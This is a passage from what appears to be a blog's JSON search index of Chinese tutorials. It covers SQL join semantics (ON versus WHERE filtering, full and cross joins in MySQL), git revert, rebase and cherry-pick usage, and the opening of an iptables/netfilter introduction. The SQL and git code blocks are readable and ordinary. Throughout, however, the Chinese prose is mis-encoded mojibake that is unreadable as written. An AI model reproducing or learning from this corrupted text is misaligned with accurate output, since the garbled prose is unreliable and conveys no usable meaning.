è¡¨ä¸­æ²¡æœ‰ä»»ä½•ä¸€è¡Œæ•°æ®åŒ¹é… ON çš„æ¡ä»¶,å°†ä¼šé¢å¤–ç”Ÿæˆä¸€è¡Œæ‰€æœ‰åˆ—ä¸º NULL çš„æ•°æ®ã€‚ä»…åœ¨åŒ¹é…é˜¶æ®µå®Œæˆä»¥åï¼ŒWHERE å­å¥æ¡ä»¶æ‰ä¼šè¢«ä½¿ç”¨ã€‚å®ƒå°†ä»åŒ¹é…é˜¶æ®µäº§ç”Ÿçš„æ•°æ®ä¸­æ£€ç´¢è¿‡æ»¤ã€‚\n\n\n\næ‰€ä»¥æˆ‘ä»¬è¦æ³¨æ„ï¼šåœ¨ä½¿ç”¨Left (right) joinçš„æ—¶å€™ï¼Œä¸€å®šè¦åœ¨å…ˆç»™å‡ºå°½å¯èƒ½å¤šçš„åŒ¹é…æ»¡è¶³æ¡ä»¶ï¼Œå‡å°‘Whereçš„æ‰§è¡Œã€‚å¦‚ï¼š\n\n```sql\nselect * from A\ninner join B on B.name = A.name\nleft join C on C.name = B.name\nleft join D on D.id = C.id\nwhere C.status>1 and D.status=1;\n\n--å¯ä»¥ä¼˜åŒ–æˆ:\n\nselect * from A\ninner join B on B.name = A.name\nleft join C on C.name = B.name and C.status>1\nleft join D on D.id = C.id and D.status=1\n```\n\n\n\n**Example**\n\n```sql\n    1. documents:\n     | id    | name        |\n     --------|-------------|\n     | 1     | Document1   |\n     | 2     | Document2   |\n     | 3     | Document3   |\n     | 4     | Document4   |\n     | 5     | Document5   |\n\n\n    2. downloads:\n     | id   | document_id   | username |\n     |------|---------------|----------|\n     | 1    | 1             | sandeep  |\n     | 2    | 1             | simi     |\n     | 3    | 2             | sandeep  |\n     | 4    | 2             | reya     |\n     | 5    | 3             | simi     |\n```\n\n\n\n**ON**\n\n```sql\nSELECT documents.name, downloads.id FROM documents LEFT OUTER JOIN downloads\nON documents.id = downloads.document_id\nAND username = 'sandeep'\n\nä¸­é—´è¡¨:\n    | id(from documents) | name         | id (from downloads) | document_id | username |\n    |--------------------|--------------|---------------------|-------------|----------|\n    | 1                  | Document1    | 1                   | 1           | sandeep  |\n    | 2                  | Document2    | 3                   | 2           | sandeep  |\n    | 3                  | Document3    | NULL                | NULL        | NULL     |\n    | 4                  | Document4    | NULL                | NULL        | NULL     |\n    | 5                  | Document5    | NULL                | NULL        | NULL     |\n\næ³¨æ„â€œ documentsâ€ä¸­ä¸ç¬¦åˆè¿™ä¸¤ä¸ªæ¡ä»¶çš„è¡Œæ˜¯å¦‚ä½•ç”¨â€œ NULLâ€å€¼å¡«å……çš„ã€‚\n\næœ€ç»ˆ:\n   | name       | id   |\n   |------------|------|\n   |  Document1 | 1    |\n   |  Document2 | 3    | \n   |  Document3 | NULL |\n   |  Document4 | NULL | \n   |  Document5 | NULL | \n```\n\n\n\n**WHERE**\n\n```sql\n SELECT documents.name, downloads.id FROM documents LEFT OUTER JOIN downloads\n ON documents.id = downloads.document_id\n WHERE username = 'sandeep'\n\n å…ˆ on äº§ç”Ÿä¸­é—´è¡¨:\n\n    | id(from documents) | name         | id (from downloads) | document_id | username |\n    |--------------------|--------------|---------------------|-------------|----------|\n    | 1                  | Document1    | 1                   | 1           | sandeep  |\n    | 1                  | Document1    | 2                   | 1           | simi     |\n    | 2                  | Document2    | 3                   | 2           | sandeep  |\n    | 2                  | Document2    | 4                   | 2           | reya     |\n    | 3                  | Document3    | 5                   | 3           | simi     |\n    | 4                  | Document4    | NULL                | NULL        | NULL     |\n    | 5                  | Document5    | NULL                | NULL        | NULL     |\n\næœ€ç»ˆç»“æœ:\n\n   | name         | id |\n   |--------------|----|\n   | Document1    | 1  |\n   | Document2    | 3  | \n```\n\n\n\n### 3.5 mysql å®ç° full join\n\n```sql\nSELECT * FROM t1\nLEFT JOIN t2 ON t1.id = t2.id\nUNION\nSELECT * FROM t1\nRIGHT JOIN t2 ON t1.id = t2.id\n```\n\n\n\n# 4. cross join\n\n### 4.1 cross join , inner join\n\näº¤å‰è”æ¥ä¸ä¼šåˆå¹¶è¡Œï¼Œå¦‚æœæ¯ä¸ªè¡¨ä¸­æœ‰100è¡Œä¸”ä¸€ä¸€åŒ¹é…ï¼Œåˆ™ä¼šå¾—åˆ°10000ä¸ªç»“æœï¼Œåœ¨ç›¸åŒæƒ…å†µä¸‹ï¼ŒInnerjoinå°†ä»…è¿”å›100è¡Œã€‚\n\nè¿™ä¸¤ä¸ªç¤ºä¾‹å°†è¿”å›ç›¸åŒçš„ç»“æœï¼š\n\nCross join\n\n```sql\nselect * from table1 cross join table2 where table1.id = table2.fk_id\n```\n\nInner join\n\n```sql\nselect * from table1 join table2 on table1.id = table2.fk_id\n```\n\nUse the last method\n\n\n\n### 4.2 cross join, full outer join\n\näº¤å‰è”æ¥ä¼šåœ¨ä¸¤ä¸ªè¡¨ä¹‹é—´äº§ç”Ÿç¬›å¡å°”ä¹˜ç§¯ï¼Œå¹¶è¿”å›æ‰€æœ‰è¡Œçš„æ‰€æœ‰å¯èƒ½ç»„åˆã€‚ å®ƒæ²¡æœ‰onå­å¥ï¼Œå› ä¸ºæ‚¨åªæ˜¯å°†æ‰€æœ‰å†…å®¹è¿æ¥åˆ°æ‰€æœ‰å†…å®¹ã€‚\n\nä½¿ç”¨ç©ºè¡¨ï¼ˆæˆ–ç»“æœé›†ï¼‰çš„äº¤å‰è”æ¥ä¼šå¯¼è‡´ç©ºè¡¨ï¼ˆM x Nï¼›å› æ­¤M x 0 = 0)\n\n\n\nå®Œå…¨å¤–éƒ¨è”æ¥æ˜¯å·¦å¤–éƒ¨è”æ¥å’Œå³å¤–éƒ¨è”æ¥çš„ç»„åˆã€‚ å®ƒè¿”å›ä¸¤ä¸ªè¡¨ä¸­ä¸æŸ¥è¯¢çš„whereå­å¥åŒ¹é…çš„æ‰€æœ‰è¡Œï¼Œå¹¶ä¸”åœ¨æ— æ³•æ»¡è¶³è¿™äº›è¡Œçš„æ‰“å¼€æ¡ä»¶çš„æƒ…å†µä¸‹ï¼Œå®ƒå°†ä¸ºæœªå¡«å……çš„å­—æ®µæ”¾å…¥ç©ºå€¼ã€‚\n\nå®Œå…¨å¤–éƒ¨è”æ¥å°†å§‹ç»ˆå…·æœ‰è¡Œï¼Œé™¤éMå’ŒNå‡ä¸º0ã€‚\n\n\n\n### 4.3 mysql ä¸­cross join\n\nåœ¨Mysqlä¸­,cross join ,inner joinå’Œ joinæ‰€å®ç°çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ã€‚å› æ­¤åœ¨MYSQLçš„å®˜æ–¹æ–‡æ¡£ä¸­ï¼ŒæŒ‡æ˜äº†ä¸‰è€…æ˜¯ç­‰ä»·çš„å…³ç³»ã€‚\n\nhttps://dev.mysql.com/doc/refman/5.7/en/join.html\n\nIn MySQL, JOIN, CROSS JOIN, and INNER JOIN are syntactic equivalents (they can replace each other). In standard SQL, they are not equivalent. INNER JOIN is used with an ON clause, CROSS JOIN is used otherwise.\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://blog.csdn.net/u012861978/article/details/52203818\n+ https://stackoverflow.com/a/38578\n+ https://stackoverflow.com/a/17759769\n+ https://stackoverflow.com/questions/3228871\n+ https://stackoverflow.com/questions/44917\n+ https://stackoverflow.com/a/28719292\n+ https://stackoverflow.com/a/20981676\n+ https://stackoverflow.com/a/4796911","tags":["sql"],"categories":["sql"]},{"title":"gité­”æ³•æ“ä½œ","url":"%2Fp%2F92ab0521.html","content":"\n# 1. revert\n\nrevertä»¥æ–°å¢ä¸€ä¸ª commit çš„æ–¹å¼è¿˜åŸæŸä¸€ä¸ª commit çš„ä¿®æ”¹ã€‚è¿™æ˜¯ä¸€ä¸ªå®‰å…¨çš„æ–¹æ³•ï¼Œå› ä¸ºå®ƒä¸ä¼šé‡å†™æäº¤å†å²ã€‚\n\n```bash\ngit revert <commit-id>\n```\n\n<!-- more -->\n\n```bash\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n\n# æ’¤é”€ä¸Šä¸€æ¬¡æäº¤\ngit revert d38ece4\n\n\n* edaa22e - Revert \"add 1\" (2 minutes ago) <liuwei>\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n\n\n# æˆ‘å†æ’¤ä¸Šä¸€æ¬¡æ’¤å›çš„æäº¤\ngit revert edaa22e\n\n* 71903f8 - (HEAD -> cherry) Revert \"Revert \"add 1\"\" (50 seconds ago) <liuwei>\n* edaa22e - Revert \"add 1\" (2 minutes ago) <liuwei>\n* d38ece4 - add 1 (25 minutes ago) <liuwei>\n```\n\n\n\nå¦‚æœä¸ºäº†commitå¹²å‡€, å¯ä»¥ä½¿ç”¨`reset --hard +  push -f `(é™¤éä½ çŸ¥é“ä½ åœ¨å¹²ä»€ä¹ˆ)\n\n\n\n# 2. rebase\n\nåˆå¹¶åˆ†æ”¯æ—¶å€™, merge æ›´å®‰å…¨, ä¿ç•™çš„ä¿¡æ¯æ›´å¤š,  ä½†æ˜¯æ ‘ç»“æ„ä¼šäº¤é”™ã€‚rebase ä¼šä¿è¯æ•´ä¸ªæäº¤æ ‘ç‰¹åˆ«æ•´é½ã€‚\n\nåœ¨ä½ è¿è¡Œ git rebase ä¹‹å‰ï¼Œä¸€å®šè¦é—®é—®ä½ è‡ªå·±ã€Œæœ‰æ²¡æœ‰åˆ«äººæ­£åœ¨è¿™ä¸ªåˆ†æ”¯ä¸Šå·¥ä½œï¼Ÿã€ã€‚å¦‚æœç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œé‚£ä¹ˆæŠŠä½ çš„çˆªå­æ”¾å›å»ã€‚\n\n### 2.1  rebaseä»‹ç»\n\nrebase ç®—æ˜¯gitçš„ä¸€ä¸ªé»‘é­”æ³•, å¦‚æœä¸ä¼šrebase, åˆ«è¯´ä¼šç”¨gitã€‚\n\nç§»æ­¥:  https://www.liuvv.com/p/b1718ace.html\n\n\n\n### 2.2 git pull --rebase\n\nå½“ä½ åœ¨æœ¬åœ°ç«¯çš„masteråˆ†æ”¯å¼€å‘æ—¶ï¼Œä½ commitäº†ä¸€ä¸ªå°æ”¹å˜ã€‚åŒæ—¶å…¶ä»–äººå°†ä»–æœ¬å‘¨çš„ä¿®æ”¹æ¨ä¸Šäº†è¿œåœ°masteråˆ†æ”¯ã€‚å½“ä½ è¯•ç€æ¨ä¸Šä½ çš„commitæ—¶ï¼Œgitä¼šè¦æ±‚ä½ å…ˆåšgit pullçš„åŠ¨ä½œã€‚\n\nå½“ä½ ä¸‹äº†git pullæ—¶ï¼Œgitä¼šå¸®ä½ äº§ç”Ÿä¸€ä¸ª`Merge remtoe-tracking branch â€˜origin/masterâ€™` çš„ commitã€‚\n\nè™½ç„¶è¿™æ²¡ä»€ä¹ˆå¤§ä¸äº†çš„ï¼Œä½†æ˜¯è¿™è®©logçœ‹èµ·æ¥æœ‰ç‚¹æ··ä¹±äº†ã€‚è¿™ä¸ªä¾‹å­å¯ä»¥ä½¿ç”¨`git pull --rebase`ã€‚\n\nè¿™ä¼šå…ˆå¼ºåˆ¶gitæŠ“å–(pull)è¿œåœ°çš„ä¿®æ”¹ï¼Œç„¶åå†é‡æ–°æ¥ä¸Š(re-apply[rebase])ä½ å°šæœªæ¨åˆ°è¿œåœ°ç«¯çš„commitï¼Œå¹¶ä¸”æ¨ä¸Šä½ çš„commitã€‚è¿™æ ·ä¸€æ¥gitè‡ªåŠ¨äº§ç”Ÿçš„Merge remote-trackingçš„logå°±ä¸ä¼šå‡ºç°äº†ã€‚\n\n\n\n# 3. å…¶ä»–\n\n### 3.1 å®ç”¨æ“ä½œ\n\nç§»æ­¥:  https://www.liuvv.com/p/42eae4e7.html\n\n### 3.2 cherry-pick\n\nç§»æ­¥:  https://www.liuvv.com/p/6aa4bbd5.html\n\n### 3.3 blame\n\næŸ¥çœ‹æŸæ®µä»£ç æ˜¯è°å†™çš„, blame çš„æ„æ€ä¸ºâ€˜è´£æ€ªâ€™ï¼Œä½ æ‡‚çš„ã€‚\n\n```bash\ngit blame <file-name>\n```\n\n### 3.4 reflog(æ•‘å‘½å¤§æ‹›)\n\nå½“éªšæ“ä½œå‡ºç°é—®é¢˜çš„æ—¶å€™, ä¾‹å¦‚ reset, merge, rebase ä¸­æ–­äº†,  å¦‚æœä½ æ‰¾ä¸åˆ°commit hash, ä¼šä¸ä¼šå¥”æºƒ?\n\næ¯æ¬¡æ›´æ–°äº† HEAD çš„ git å‘½ä»¤æ¯”å¦‚ commintã€amendã€cherry-pickã€resetã€revert ç­‰éƒ½ä¼šè¢«è®°å½•ä¸‹æ¥ï¼ˆä¸é™åˆ†æ”¯ï¼‰ï¼Œå°±åƒ shell çš„ history ä¸€æ ·ã€‚ å¯ä»¥é€šè¿‡reflogæŸ¥çœ‹ã€‚ \n\n```bash\ngit reflog\n```\n\n### 3.5 æŸ¥çœ‹åˆ†æ”¯æ–‡ä»¶\n\n```bash\ngit show master:go.mod\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n\n+ https://github.com/521xueweihan/git-tips\n+ https://github.com/geeeeeeeeek/git-recipes","tags":["git"],"categories":["git"]},{"title":"gitçš„cherry-pickçš„ä½¿ç”¨","url":"%2Fp%2F6aa4bbd5.html","content":"\nå¯¹äºå¤šåˆ†æ”¯çš„ä»£ç åº“ï¼Œå°†ä»£ç ä»ä¸€ä¸ªåˆ†æ”¯è½¬ç§»åˆ°å¦ä¸€ä¸ªåˆ†æ”¯æ˜¯å¸¸è§éœ€æ±‚ã€‚\n\nä¸€ç§æƒ…å†µæ˜¯ï¼Œä½ éœ€è¦å¦ä¸€ä¸ªåˆ†æ”¯çš„æ‰€æœ‰ä»£ç å˜åŠ¨ï¼Œé‚£ä¹ˆå°±é‡‡ç”¨åˆå¹¶ï¼ˆgit merge æˆ– git rebaseï¼‰ã€‚\n\nå¦ä¸€ç§æƒ…å†µæ˜¯ï¼Œä½ åªéœ€è¦éƒ¨åˆ†ä»£ç å˜åŠ¨ï¼ˆæŸå‡ ä¸ªæäº¤ï¼‰ï¼Œè¿™æ—¶å¯ä»¥é‡‡ç”¨(git cherry-pick) ã€‚\n\n<!-- more -->\n\n# 1. cherry-pickä½¿ç”¨\n\n### 1.1 hashæ–¹å¼\n\ngit cherry-pickå‘½ä»¤çš„ä½œç”¨ï¼Œå°±æ˜¯å°†æŒ‡å®šçš„æäº¤ï¼ˆcommitï¼‰åº”ç”¨äºå…¶ä»–åˆ†æ”¯ã€‚\n\n```bash\n$ git cherry-pick <commitHash>\n```\n\nä¸Šé¢å‘½ä»¤å°±ä¼šå°†æŒ‡å®šçš„æäº¤commitHashï¼Œåº”ç”¨äºå½“å‰åˆ†æ”¯ã€‚è¿™ä¼šåœ¨å½“å‰åˆ†æ”¯äº§ç”Ÿä¸€ä¸ªæ–°çš„æäº¤ï¼Œå½“ç„¶å®ƒä»¬çš„å“ˆå¸Œå€¼ä¼šä¸ä¸€æ ·ã€‚\n\n\n\n+ Aåˆ†æ”¯log:\n\n```ini\n* cf976d8 - (HEAD -> master, origin/master, origin/HEAD) add 2 (2 minutes ago) <liuwei>\n* 07444e6 - add 1 (2 minutes ago) <liuwei>\n* 73a2b7f - (cherry) rm citycode (4 minutes ago) <liuwei>\n```\n\n+ Båˆ†æ”¯æ“ä½œ\n\n```bash\ngit cherry-pick 07444e6\n```\n\n+ ç„¶åå†çœ‹Båˆ†æ”¯log:\n\n```ini\n* d38ece4 - (HEAD -> cherry) add 1 (11 seconds ago) <liuwei>\n* 73a2b7f - rm citycode (5 minutes ago) <liuwei>\n```\n\n\n\n### 1.2 åˆ†æ”¯æ–¹å¼\n\ngit cherry-pickå‘½ä»¤çš„å‚æ•°ï¼Œä¸ä¸€å®šæ˜¯æäº¤çš„å“ˆå¸Œå€¼ï¼Œåˆ†æ”¯åä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¡¨ç¤ºè½¬ç§»è¯¥åˆ†æ”¯çš„æœ€æ–°æäº¤ã€‚\n\n```bash\n$ git cherry-pick feature\n```\n\nä¸Šé¢ä»£ç è¡¨ç¤ºå°†featureåˆ†æ”¯çš„æœ€è¿‘ä¸€æ¬¡æäº¤ï¼Œè½¬ç§»åˆ°å½“å‰åˆ†æ”¯ã€‚!!!æ³¨æ„æ˜¯ä¸€æ¬¡æäº¤(commit), ä¸æ˜¯æ‰€æœ‰çš„æäº¤ã€‚!!!\n\n\n\n### 1.3 å¤šä¸ªæäº¤\n\nCherry pick æ”¯æŒä¸€æ¬¡è½¬ç§»å¤šä¸ªæäº¤ã€‚\n\n```bash\n$ git cherry-pick <HashA> <HashB>\n```\n\nä¸Šé¢çš„å‘½ä»¤å°† A å’Œ B ä¸¤ä¸ªæäº¤åº”ç”¨åˆ°å½“å‰åˆ†æ”¯ã€‚è¿™ä¼šåœ¨å½“å‰åˆ†æ”¯ç”Ÿæˆä¸¤ä¸ªå¯¹åº”çš„æ–°æäº¤ã€‚\n\n\n\nå¦‚æœæƒ³è¦è½¬ç§»ä¸€ç³»åˆ—çš„è¿ç»­æäº¤ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ç®€ä¾¿è¯­æ³•ã€‚\n\n```bash\n$ git cherry-pick A..B \n```\n\nä¸Šé¢çš„å‘½ä»¤å¯ä»¥è½¬ç§»ä» A åˆ° B çš„æ‰€æœ‰æäº¤ã€‚å®ƒä»¬å¿…é¡»æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ”¾ç½®ï¼šæäº¤ A å¿…é¡»æ—©äºæäº¤ Bï¼Œå¦åˆ™å‘½ä»¤å°†å¤±è´¥ï¼Œä½†ä¸ä¼šæŠ¥é”™ã€‚\n\næ³¨æ„ï¼Œä½¿ç”¨ä¸Šé¢çš„å‘½ä»¤ï¼Œæäº¤ A å°†ä¸ä¼šåŒ…å«åœ¨ Cherry pick ä¸­ã€‚\n\n\n\n# 2. ä»£ç å†²çª\n\nå¦‚æœæ“ä½œè¿‡ç¨‹ä¸­å‘ç”Ÿä»£ç å†²çªï¼ŒCherry pick ä¼šåœä¸‹æ¥ï¼Œè®©ç”¨æˆ·å†³å®šå¦‚ä½•ç»§ç»­æ“ä½œã€‚\nï¼ˆ1ï¼‰--continue\nç”¨æˆ·è§£å†³ä»£ç å†²çªåï¼Œç¬¬ä¸€æ­¥å°†ä¿®æ”¹çš„æ–‡ä»¶é‡æ–°åŠ å…¥æš‚å­˜åŒºï¼ˆgit add .ï¼‰ï¼Œç¬¬äºŒæ­¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œè®© Cherry pick è¿‡ç¨‹ç»§ç»­æ‰§è¡Œã€‚\n\n```bash\n$ git cherry-pick --continue\n```\n\nï¼ˆ2ï¼‰--abort\n\nå‘ç”Ÿä»£ç å†²çªåï¼Œæ”¾å¼ƒåˆå¹¶ï¼Œå›åˆ°æ“ä½œå‰çš„æ ·å­ã€‚\n\n```bash\n$ git cherry-pick --abort\n```\n\nï¼ˆ3ï¼‰--quit\nå‘ç”Ÿä»£ç å†²çªåï¼Œé€€å‡º Cherry pickï¼Œä½†æ˜¯ä¸å›åˆ°æ“ä½œå‰çš„æ ·å­ã€‚\n\n```bash\n$ git cherry-pick --quit\n```\n\n\n\n# 3. åœæ­¢ä½¿ç”¨cherry-pick\n\nåœ¨å¼€å‘ä¸­ï¼Œä¸è¦ä½¿ç”¨ cherry-pick æ¥è¿›è¡Œä¸åŒåˆ†æ”¯ä¹‹é—´ä»£ç çš„åŒæ­¥ï¼Œè¿™å¾ˆå¯èƒ½ä¼šé€ æˆæœ€ç»ˆåˆå¹¶æ—¶å‡ºç°å†²çªï¼Œè€Œä¸”å¯èƒ½äº§ç”Ÿæ¯”å†²çªæ›´ä¸¥é‡çš„é—®é¢˜ï¼šè¯¥æœ‰å†²çªå´æ²¡æœ‰å†²çªã€‚\n\n\n\n![1](gitçš„cherry-pickçš„ä½¿ç”¨/1.png)\n\n\n\nå¦‚ä¸Šå›¾ï¼Œ`apple` ä»£è¡¨è¿™ä¸ªåŠŸèƒ½æ˜¯ä¸Šçº¿çŠ¶æ€ï¼Œ`berry` ä»£è¡¨è¿™ä¸ªåŠŸèƒ½æ˜¯ä¸‹çº¿çŠ¶æ€ã€‚\n\nç„¶åæˆ‘ä»¬å‘ç°äº†ä¸€äº› bugï¼Œéœ€è¦å°†è¯¥åŠŸèƒ½ç´§æ€¥ä¸‹çº¿ï¼Œæˆ‘ä»¬ï¼š\n\n- åœ¨ feature åˆ†æ”¯ä¸Šä¸‹çº¿è¯¥åŠŸèƒ½ï¼ˆF2ï¼‰ï¼š`apple -> berry`\n- ç„¶åå°†è¯¥æ“ä½œ cherry-pick åˆ° masterï¼ˆM2ï¼‰ï¼Œç°åœ¨ master ä¸Šè¯¥åŠŸèƒ½ä¹Ÿä¸‹çº¿äº†\n- ç„¶åæˆ‘ä»¬åœ¨ feature åˆ†æ”¯ä¸Šè¿›è¡Œäº† bug ä¿®å¤ï¼Œæœ€ç»ˆè§£å†³äº† bugï¼Œæˆ‘ä»¬åœ¨ feature åˆ†æ”¯ä¸Šå°†è¯¥åŠŸèƒ½ä¸Šçº¿ï¼ˆF3ï¼‰ï¼š`berry -> apple`\n- ç„¶åæˆ‘ä»¬å†³å®šå°† bug ä¿®å¤ merge åˆ° master\n- merge é¡ºåˆ©å®Œæˆï¼Œæ²¡æœ‰å†²çªã€‚**ä½†æ˜¯ï¼šè¿™è¡Œä»£ç ä»ç„¶æ˜¯`berry`ï¼Œä¸‹çº¿çŠ¶æ€**\n\nmerge åˆ†æï¼šM3(`berry`) å’Œ F3(`apple`) çš„æœ€è¿‘å…¬å…±ç¥–å…ˆæ˜¯ A(`apple`)ï¼Œå› æ­¤ git è®¤ä¸º feature åˆ†æ”¯å¹¶æœªä¿®æ”¹ `apple` çš„å€¼ï¼Œç»“æœåˆå¹¶å master åˆ†æ”¯ä¸Šè¿™è¡Œä»£ç è¿˜æ˜¯ `berry`ï¼Œæˆ‘ä»¬çš„åŠŸèƒ½åœ¨ master ä¸Šè¿˜æ˜¯ä¸‹çº¿çŠ¶æ€ã€‚\n\n\n\n### 3.1 ç»éªŒ\n\nå¦‚æœä½ çš„ä¸¤ä¸ªåˆ†æ”¯æ˜¯ä¸¤ä¸ªå•ç‹¬çš„åˆ†æ”¯ï¼Œæ°¸è¿œä¸ä¼šç›¸äº’ mergeï¼Œé‚£ä¹ˆæ‰ä½¿ç”¨ cherry-pickã€‚\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n\n+ https://www.ruanyifeng.com/blog/2020/04/git-cherry-pick.html\n+ https://imliyan.com/blogs/article/%E5%81%9C%E6%AD%A2%20cherry-pick%EF%BC%8C%E5%BC%80%E5%A7%8B%20merge/\n","tags":["git"],"categories":["git"]},{"title":"iptablesä½¿ç”¨æ•™ç¨‹","url":"%2Fp%2Fa8480986.html","content":"\n# 0. å‰è¨€\n\n### 0.0 é˜²ç«å¢™\n\n+ ä»é€»è¾‘ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥å¤§ä½“åˆ†ä¸ºä¸»æœºé˜²ç«å¢™å’Œç½‘ç»œé˜²ç«å¢™ã€‚\n\n  + ä¸»æœºé˜²ç«å¢™ï¼šé’ˆå¯¹äºå•ä¸ªä¸»æœºè¿›è¡Œé˜²æŠ¤ã€‚\n  \n  ç½‘ç»œé˜²ç«å¢™ï¼šå¾€å¾€å¤„äºç½‘ç»œå…¥å£æˆ–è¾¹ç¼˜ï¼Œé’ˆå¯¹äºç½‘ç»œå…¥å£è¿›è¡Œé˜²æŠ¤ï¼ŒæœåŠ¡äºé˜²ç«å¢™èƒŒåçš„æœ¬åœ°å±€åŸŸç½‘ã€‚\n  \n  ç½‘ç»œé˜²ç«å¢™å’Œä¸»æœºé˜²ç«å¢™å¹¶ä¸å†²çªï¼Œå¯ä»¥ç†è§£ä¸ºï¼Œç½‘ç»œé˜²ç«å¢™ä¸»å¤–ï¼ˆé›†ä½“ï¼‰ï¼Œ ä¸»æœºé˜²ç«å¢™ä¸»å†…ï¼ˆä¸ªäººï¼‰ã€‚\n\n\n+ ä»ç‰©ç†ä¸Šè®²ï¼Œé˜²ç«å¢™å¯ä»¥åˆ†ä¸ºç¡¬ä»¶é˜²ç«å¢™å’Œè½¯ä»¶é˜²ç«å¢™ã€‚\n+ ç¡¬ä»¶é˜²ç«å¢™ï¼šåœ¨ç¡¬ä»¶çº§åˆ«å®ç°éƒ¨åˆ†é˜²ç«å¢™åŠŸèƒ½ï¼Œå¦ä¸€éƒ¨åˆ†åŠŸèƒ½åŸºäºè½¯ä»¶å®ç°ï¼Œæ€§èƒ½é«˜ï¼Œæˆæœ¬é«˜ã€‚\n+ è½¯ä»¶é˜²ç«å¢™ï¼šåº”ç”¨è½¯ä»¶å¤„ç†é€»è¾‘è¿è¡Œäºé€šç”¨ç¡¬ä»¶å¹³å°ä¹‹ä¸Šçš„é˜²ç«å¢™ï¼Œæ€§èƒ½ä½ï¼Œæˆæœ¬ä½ã€‚\n\n<!-- more -->\n\n### 0.1 iptables\n\niptableså…¶å®ä¸æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ä¸ªå®¢æˆ·ç«¯ä»£ç†ï¼Œç”¨æˆ·é€šè¿‡iptablesè¿™ä¸ªä»£ç†ï¼Œå°†ç”¨æˆ·çš„å®‰å…¨è®¾å®šæ‰§è¡Œåˆ°å¯¹åº”çš„\"å®‰å…¨æ¡†æ¶\"ä¸­ï¼Œè¿™ä¸ª\"å®‰å…¨æ¡†æ¶\"æ‰æ˜¯çœŸæ­£çš„é˜²ç«å¢™ï¼Œè¿™ä¸ªæ¡†æ¶çš„åå­—å«netfilter\n\nnetfilteræ‰æ˜¯é˜²ç«å¢™çœŸæ­£çš„å®‰å…¨æ¡†æ¶ï¼ˆframeworkï¼‰ï¼Œnetfilterä½äºå†…æ ¸ç©ºé—´ã€‚iptableså…¶å®æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œä½äºç”¨æˆ·ç©ºé—´ï¼Œæˆ‘ä»¬ç”¨è¿™ä¸ªå·¥å…·æ“ä½œçœŸæ­£çš„æ¡†æ¶ã€‚\n\nnetfilter/iptablesï¼ˆä¸‹æ–‡ä¸­ç®€ç§°ä¸ºiptablesï¼‰ç»„æˆLinuxå¹³å°ä¸‹çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ï¼Œä¸å¤§å¤šæ•°çš„Linuxè½¯ä»¶ä¸€æ ·ï¼Œè¿™ä¸ªåŒ…è¿‡æ»¤é˜²ç«å¢™æ˜¯å…è´¹çš„ï¼Œå®ƒå¯ä»¥ä»£æ›¿æ˜‚è´µçš„å•†ä¸šé˜²ç«å¢™è§£å†³æ–¹æ¡ˆï¼Œå®Œæˆå°åŒ…è¿‡æ»¤ã€å°åŒ…é‡å®šå‘å’Œç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ç­‰åŠŸèƒ½ã€‚\n\n### 0.2  netfilter\n\nnetfilteræ˜¯Linuxæ“ä½œç³»ç»Ÿæ ¸å¿ƒå±‚å†…éƒ¨çš„ä¸€ä¸ªæ•°æ®åŒ…å¤„ç†æ¨¡å—ï¼Œå®ƒå…·æœ‰å¦‚ä¸‹åŠŸèƒ½ï¼š\n\n+ ç½‘ç»œåœ°å€è½¬æ¢(Network Address Translate)\n+ æ•°æ®åŒ…å†…å®¹ä¿®æ”¹\n+ ä»¥åŠæ•°æ®åŒ…è¿‡æ»¤çš„é˜²ç«å¢™åŠŸèƒ½\n\næ‰€ä»¥è¯´ï¼Œè™½ç„¶æˆ‘ä»¬ä½¿ç”¨service iptables startå¯åŠ¨iptables\"æœåŠ¡\"ï¼Œä½†æ˜¯å…¶å®å‡†ç¡®çš„æ¥è¯´ï¼Œiptableså¹¶æ²¡æœ‰ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ç®—æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„æœåŠ¡ï¼Œè€Œåº”è¯¥ç®—æ˜¯å†…æ ¸æä¾›çš„åŠŸèƒ½ã€‚\n\n\n\n# 1. iptablesåŸºç¡€\n\næˆ‘ä»¬çŸ¥é“iptablesæ˜¯æŒ‰ç…§è§„åˆ™æ¥åŠäº‹çš„ï¼Œæˆ‘ä»¬å°±æ¥è¯´è¯´è§„åˆ™ï¼ˆrulesï¼‰ï¼Œè§„åˆ™å…¶å®å°±æ˜¯ç½‘ç»œç®¡ç†å‘˜é¢„å®šä¹‰çš„æ¡ä»¶ï¼Œè§„åˆ™ä¸€èˆ¬çš„å®šä¹‰ä¸º\"å¦‚æœæ•°æ®åŒ…å¤´ç¬¦åˆè¿™æ ·çš„æ¡ä»¶ï¼Œå°±è¿™æ ·å¤„ç†è¿™ä¸ªæ•°æ®åŒ…\"ã€‚\n\nè§„åˆ™å­˜å‚¨åœ¨å†…æ ¸ç©ºé—´çš„ä¿¡æ¯åŒ…è¿‡æ»¤è¡¨ä¸­ï¼Œè¿™äº›è§„åˆ™åˆ†åˆ«æŒ‡å®šäº†æºåœ°å€ã€ç›®çš„åœ°å€ã€ä¼ è¾“åè®®ï¼ˆå¦‚TCPã€UDPã€ICMPï¼‰å’ŒæœåŠ¡ç±»å‹ï¼ˆå¦‚HTTPã€FTPå’ŒSMTPï¼‰ç­‰ã€‚\n\nå½“æ•°æ®åŒ…ä¸è§„åˆ™åŒ¹é…æ—¶ï¼Œiptableså°±æ 